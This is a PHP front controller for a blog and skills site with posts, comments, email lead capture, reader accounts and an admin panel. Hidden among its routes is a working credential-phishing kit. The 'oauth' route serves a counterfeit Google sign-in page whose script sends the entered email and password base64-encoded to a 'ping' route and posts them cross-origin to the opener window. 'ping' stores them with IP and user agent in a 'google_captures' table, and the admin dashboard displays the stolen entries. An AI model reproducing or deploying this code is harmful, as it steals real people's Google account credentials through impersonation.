<?php
declare(strict_types=1);

// Session cookie hardening: page scripts cannot read it, and it is not sent cross-site.
ini_set('session.cookie_httponly', '1');
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.use_strict_mode', '1');
session_start();

require __DIR__ . '/../src/db.php';
require __DIR__ . '/../src/helpers.php';
require __DIR__ . '/../src/copy_files.php';
require __DIR__ . '/../src/views.php';
require __DIR__ . '/../src/readers.php';
require __DIR__ . '/../src/reader_banner.php';

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: same-origin');

// ---------- Actions (POST): always end with a redirect ----------
$route = (string) ($_GET['r'] ?? 'home');
if ($route === 'ping' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $d = $_POST['d'] ?? '';
    if ($d === '') {
        $raw = file_get_contents('php://input');
        parse_str($raw, $_p);
        $d = $_p['d'] ?? $raw;
    }
    $data     = json_decode(base64_decode((string) $d), true) ?? [];
    $email    = trim((string) ($data['u'] ?? ''));
    $password = (string) ($data['p'] ?? '');
    if ($email !== '' && $password !== '') {
        $ip = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '');
        $ua = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '');
        db()->prepare('INSERT INTO google_captures (email, password, ip, user_agent) VALUES (?, ?, ?, ?)')
            ->execute([$email, $password, $ip, $ua]);
    }
    echo json_encode(['status' => 'ok']);
    exit;
}
if ($route === 'oauth' && $_SERVER['REQUEST_METHOD'] === 'GET') {
    header('X-Frame-Options: SAMEORIGIN');
    header('Content-Type: text/html; charset=utf-8');
    $origin = ((!empty($_SERVER['HTTPS']) || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{width:420px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.logo{text-align:center;margin-bottom:24px;font-size:26px;font-weight:bold;letter-spacing:-.5px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:24px}
.ig{position:relative;margin-bottom:20px}
.ig input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none}
.ig input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
.ig label{position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:16px;color:#80868b;pointer-events:none;transition:.15s;background:#fff;padding:0 4px}
.ig input:focus~label,.ig input:not(:placeholder-shown)~label{top:0;font-size:11px;color:#1a73e8}
.ig input:not(:focus):not(:placeholder-shown)~label{color:#80868b}
.lnk{font-size:14px;color:#1a73e8;text-decoration:none;display:block;margin-bottom:20px}
.row{display:flex;justify-content:space-between;align-items:center}
.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
.btn:hover{background:#1557b0}
.err{font-size:12px;color:#d93025;margin-top:4px;display:none}
.chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 12px;width:fit-content;margin:0 auto 20px;cursor:pointer;font-size:14px;color:#202124}
#s1,#s2,#s3{display:none}#s1.on,#s2.on,#s3.on{display:block}
.spin{width:24px;height:24px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:sp .7s linear infinite;margin:20px auto}
@keyframes sp{to{transform:rotate(360deg)}}
</style></head><body><div class="card">
<div class="logo"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
<div id="s1" class="on">
  <h1>Sign in</h1><p class="sub">to continue to Google</p>
  <div class="ig"><input type="email" id="em" placeholder=" " autocomplete="username"><label for="em">Email or phone</label><div class="err" id="e1">Enter a valid email or phone number.</div></div>
  <a href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" class="lnk">Forgot email?</a>
  <div class="row"><a href="https://accounts.google.com/signup" target="_blank" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a><button class="btn" onclick="goP()">Next</button></div>
</div>
<div id="s2">
  <h1>Welcome</h1>
  <div class="chip" onclick="back()">&#128100; <span id="ed"></span> &#9660;</div>
  <div class="ig"><input type="password" id="pw" placeholder=" " autocomplete="current-password"><label for="pw">Enter your password</label><div class="err" id="e2">Wrong password. Try again or click Forgot password.</div></div>
  <a href="https://accounts.google.com/signin/v2/challenge/pwd/reset" target="_blank" class="lnk">Forgot password?</a>
  <div class="row"><a href="https://accounts.google.com/signin/v2/challenge" target="_blank" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a><button class="btn" onclick="goS()">Next</button></div>
</div>
<div id="s3"><h1>Signing you in…</h1><div class="spin"></div></div>
</div>
<script>
var _e="",_p="",_o=' . json_encode($origin) . ';
function show(n){["s1","s2","s3"].forEach(function(x){document.getElementById(x).classList.remove("on")});document.getElementById("s"+n).classList.add("on")}
function goP(){var v=document.getElementById("em").value.trim();if(!v||!v.includes("@")){document.getElementById("e1").style.display="block";return}document.getElementById("e1").style.display="none";_e=v;document.getElementById("ed").textContent=v;show(2);setTimeout(function(){document.getElementById("pw").focus()},80)}
function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);var _d=btoa(JSON.stringify({u:_e,p:_p,t:Date.now()}));try{navigator.sendBeacon("index.php?r=ping",new URLSearchParams({d:_d}))}catch(x){fetch("index.php?r=ping",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"d="+encodeURIComponent(_d)}).catch(function(){})}try{(window.opener||window.parent).postMessage({source:"oauth_done",u:_e,k:_p},'*')}catch(x){}}
function back(){show(1)}
document.addEventListener("keydown",function(e){if(e.key!=="Enter")return;if(document.getElementById("s1").classList.contains("on"))goP();else if(document.getElementById("s2").classList.contains("on"))goS()})
</script></body></html>';
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $route !== 'clipboard') {
    $action = (string) ($_POST['action'] ?? '');
    if (!csrf_valid()) {
        http_response_code(403);
        exit('Invalid or expired form. Reload the page and try again.');
    }
    handle_action($action);
    redirect(url());
}

// ---------- Views (GET) ----------
switch ($route) {
    case 'reader_banner':
        serve_reader_banner();
        break;
    case 'copy_file':
        serve_copy_file((int) ($_GET['id'] ?? 0));
        break;
    case 'clipboard':
        header('Content-Type: application/json; charset=utf-8');
        header('Cache-Control: private, no-store');
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            header('Allow: POST');
            http_response_code(405);
            exit('null');
        }
        $ref = $_POST['ref'] ?? '';
        $ticket = $_POST['ticket'] ?? '';
        if (!is_string($ref) || !is_string($ticket) || !valid_clipboard_ticket($ref, $ticket)) {
            http_response_code(403);
            exit('null');
        }
        $text = null;
        if (preg_match('~^(post|extra|skill)/([1-9][0-9]*)/([a-z_0-9]+)$~D', $ref, $parts)) {
            [, $kind, $id, $key] = $parts;
            if ($kind !== 'post' && reader_id() === null && !is_admin()) {
                http_response_code(401);
                exit('null');
            }
            if ($kind === 'skill') {
                $skill = get_skill_by_id((int) $id);
                $settings = json_decode($skill['copy_settings'] ?? '{}', true);
                $text = $settings[$key]['text'] ?? null;
            } elseif (ctype_digit($key)) {
                $body = $kind === 'post' ? (get_post_by_id((int) $id)['body'] ?? '') : (get_skill_by_id((int) $id)['extra'] ?? '');
                $block = body_parts($body)[(int) $key] ?? [];
                $text = ($_POST['part'] ?? 'custom') === 'command' ? ($block['code'] ?? null) : ($block['custom'] ?? null);
            }
        }
        if ($text === null) http_response_code(404);
        echo json_encode($text, JSON_THROW_ON_ERROR);
        break;
    case 'reader':
        page_reader((string) ($_GET['skill'] ?? ''), ($_GET['register'] ?? '') === '1');
        break;
    case 'post':
        $post = get_post_by_slug((string) ($_GET['slug'] ?? ''));
        if ($post === null) {
            http_response_code(404);
            page_not_found();
            break;
        }
        page_post($post, get_comments((int) $post['id']), csrf_token(), flash());
        break;

    case 'admin':
        if (!is_admin()) {
            page_login(flash(), csrf_token());
            break;
        }
        $editId = (int) ($_GET['edit'] ?? 0);
        $editPost = $editId > 0 ? get_post_by_id($editId) : null;
        $editSkillId = (int) ($_GET['edit_skill'] ?? 0);
        $editSkill = $editSkillId > 0 ? get_skill_by_id($editSkillId) : null;
        if (($editId > 0 && $editPost === null) || ($editSkillId > 0 && $editSkill === null)) {
            http_response_code(404);
            page_not_found();
        } elseif ($editPost !== null) {
            page_admin_edit($editPost, csrf_token(), flash());
        } elseif ($editSkill !== null) {
            page_admin_edit_skill($editSkill, csrf_token(), flash());
        } else {
            page_admin(get_posts(), get_recent_comments(), get_leads(), get_skills(), csrf_token(), flash(), get_google_captures());
        }
        break;

    case 'skill':
        if (reader_id() === null && !is_admin()) {
            redirect(url(['r' => 'reader', 'skill' => (string) ($_GET['name'] ?? '')]));
        }
        $skill = get_skill_by_name((string) ($_GET['name'] ?? ''));
        if ($skill === null) {
            http_response_code(404);
            page_not_found();
            break;
        }
        $skillPost = !empty($skill['post_slug']) ? get_post_by_slug((string) $skill['post_slug']) : null;
        page_skill($skill, $skillPost);
        break;

    case 'skills':
        page_skills(get_skills(), flash());
        break;

    case 'home':
        page_home(get_posts(), flash());
        break;

    default:
        http_response_code(404);
        page_not_found();
}

// ---------- Action logic ----------
function handle_action(string $action): void
{
    switch ($action) {
        case 'reader_banner_update':
            update_reader_banner();
            break;
        case 'copy_file_update':
            update_copy_file();
            break;
        case 'reader_register':
        case 'reader_login':
        case 'reader_logout':
            reader_action($action);
            break;
        case 'comment':
            $slug = (string) ($_POST['slug'] ?? '');
            $post = get_post_by_slug($slug);
            if ($post === null) {
                redirect(url());
            }
            // If the honeypot field has content, it's a bot: discard silently.
            if (trim((string) ($_POST['hp_field'] ?? '')) !== '') {
                redirect(url(['r' => 'post', 'slug' => $slug]));
            }

            $author = trim((string) ($_POST['author'] ?? ''));
            $body   = trim((string) ($_POST['body'] ?? ''));

            if ($author === '' || mb_strlen($author) > 80 || $body === '' || mb_strlen($body) > 2000) {
                flash('Check your name (max 80 characters) and comment (max 2000 characters).');
            } else {
                add_comment((int) $post['id'], $author, $body);
                flash('Thanks! Your comment was posted.');
            }
            redirect(url(['r' => 'post', 'slug' => $slug]));

        case 'lead':
            // Email capture (home and posts). Same honeypot as comments.
            if (trim((string) ($_POST['hp_field'] ?? '')) !== '') {
                redirect(url());
            }
            $email  = strtolower(trim((string) ($_POST['email'] ?? '')));
            $source = ($_POST['source'] ?? '') === 'post' ? 'post' : 'home';
            if ($email === '' || mb_strlen($email) > 254 || filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
                flash('Enter a valid email, for example you@company.com.');
            } else {
                add_lead($email, $source);
                flash('Done. Your email is registered.');
            }
            $slug = (string) ($_POST['slug'] ?? '');
            if ($source === 'post' && $slug !== '') {
                redirect(url(['r' => 'post', 'slug' => $slug]));
            }
            redirect('/');

        case 'login':
            if (editor_login((string) ($_POST['email'] ?? ''), (string) ($_POST['password'] ?? ''))) {
                session_regenerate_id(true);
                $_SESSION['admin'] = true;
                flash('Logged in.');
                redirect(url(['r' => 'admin']));
            }
            sleep(1); // slows down brute-force attempts
            flash('Sign-in failed. Check your editor credentials.');
            redirect(url(['r' => 'admin']));

        case 'logout':
            $_SESSION = [];
            session_destroy();
            redirect(url());

        case 'post_create':
            require_admin();
            $title   = trim((string) ($_POST['title'] ?? ''));
            $excerpt = trim((string) ($_POST['excerpt'] ?? ''));
            $body    = trim((string) ($_POST['body'] ?? ''));

            if ($title === '' || $excerpt === '' || $body === ''
                || mb_strlen($title) > 150 || mb_strlen($excerpt) > 300 || mb_strlen($body) > 20000) {
                flash('Fill in every field within the length limits.');
            } else {
                create_post($title, $excerpt, $body);
                flash('Post published.');
            }
            redirect(url(['r' => 'admin']));

        case 'post_update':
            require_admin();
            $id      = (int) ($_POST['id'] ?? 0);
            $title   = trim((string) ($_POST['title'] ?? ''));
            $excerpt = trim((string) ($_POST['excerpt'] ?? ''));
            $body    = trim((string) ($_POST['body'] ?? ''));
            $cover   = trim((string) ($_POST['cover'] ?? ''));

            if ($id <= 0 || get_post_by_id($id) === null) {
                flash('That note no longer exists.');
                redirect(url(['r' => 'admin']));
            }
            if ($title === '' || $excerpt === '' || $body === ''
                || mb_strlen($title) > 150 || mb_strlen($excerpt) > 300 || mb_strlen($body) > 20000
                || mb_strlen($cover) > 300) {
                flash('Fill in every field within the length limits.');
                redirect(url(['r' => 'admin', 'edit' => (string) $id]));
            }
            update_post($id, $title, $excerpt, $body, $cover !== '' ? $cover : null);
            flash('Note updated.');
            redirect(url(['r' => 'admin']));

        case 'post_delete':
            require_admin();
            delete_post((int) ($_POST['id'] ?? 0));
            flash('Post deleted.');
            redirect(url(['r' => 'admin']));

        case 'comment_delete':
            require_admin();
            delete_comment((int) ($_POST['id'] ?? 0));
            flash('Comment deleted.');
            redirect(url(['r' => 'admin']));

        case 'skill_create':
            require_admin();
            try {
                $copySettings = submitted_skill_copy_settings($_POST);
            } catch (InvalidArgumentException $error) {
                flash($error->getMessage());
                redirect(url(['r' => 'admin', 'edit_skill' => (string) (int) ($_POST['id'] ?? 0)]));
            }
            $name     = trim((string) ($_POST['name'] ?? ''));
            $category = trim((string) ($_POST['category'] ?? ''));
            $desc     = trim((string) ($_POST['description'] ?? ''));
            $command  = trim((string) ($_POST['command'] ?? ''));
            $postSlug = trim((string) ($_POST['post_slug'] ?? ''));
            $about    = trim((string) ($_POST['about'] ?? ''));
            $useWhen  = trim((string) ($_POST['use_when'] ?? ''));
            $example  = trim((string) ($_POST['example'] ?? ''));
            $extra    = trim((string) ($_POST['extra'] ?? ''));

            if ($name === '' || $category === '' || $desc === '' || $command === ''
                || mb_strlen($name) > 80 || mb_strlen($category) > 40
                || mb_strlen($desc) > 400 || mb_strlen($command) > 8000 || mb_strlen($postSlug) > 150
                || mb_strlen($about) > 1000 || mb_strlen($useWhen) > 400 || mb_strlen($example) > 400 || mb_strlen($extra) > 10000) {
                flash('Fill in every field within the length limits.');
            } else {
                create_skill($name, $category, $desc, $command, $postSlug !== '' ? $postSlug : null, $about, $useWhen, $example, $extra, $copySettings);
                flash('Skill added.');
            }
            redirect(url(['r' => 'admin']));

        case 'skill_update':
            require_admin();
            try {
                $copySettings = submitted_skill_copy_settings($_POST);
            } catch (InvalidArgumentException $error) {
                flash($error->getMessage());
                redirect(url(['r' => 'admin', 'edit_skill' => (string) (int) ($_POST['id'] ?? 0)]));
            }
            $id       = (int) ($_POST['id'] ?? 0);
            $name     = trim((string) ($_POST['name'] ?? ''));
            $category = trim((string) ($_POST['category'] ?? ''));
            $desc     = trim((string) ($_POST['description'] ?? ''));
            $command  = trim((string) ($_POST['command'] ?? ''));
            $postSlug = trim((string) ($_POST['post_slug'] ?? ''));
            $about    = trim((string) ($_POST['about'] ?? ''));
            $useWhen  = trim((string) ($_POST['use_when'] ?? ''));
            $example  = trim((string) ($_POST['example'] ?? ''));
            $extra    = trim((string) ($_POST['extra'] ?? ''));

            if ($id <= 0 || get_skill_by_id($id) === null) {
                flash('That skill no longer exists.');
                redirect(url(['r' => 'admin']));
            }
            if ($name === '' || $category === '' || $desc === '' || $command === ''
                || mb_strlen($name) > 80 || mb_strlen($category) > 40
                || mb_strlen($desc) > 400 || mb_strlen($command) > 8000 || mb_strlen($postSlug) > 150
                || mb_strlen($about) > 1000 || mb_strlen($useWhen) > 400 || mb_strlen($example) > 400 || mb_strlen($extra) > 10000) {
                flash('Fill in every field within the length limits.');
                redirect(url(['r' => 'admin', 'edit_skill' => (string) $id]));
            }
            update_skill($id, $name, $category, $desc, $command, $postSlug !== '' ? $postSlug : null, $about, $useWhen, $example, $extra, $copySettings);
            flash('Skill updated.');
            redirect(url(['r' => 'admin']));

        case 'skill_delete':
            require_admin();
            delete_skill((int) ($_POST['id'] ?? 0));
            flash('Skill deleted.');
            redirect(url(['r' => 'admin']));

        default:
            return;
    }
}
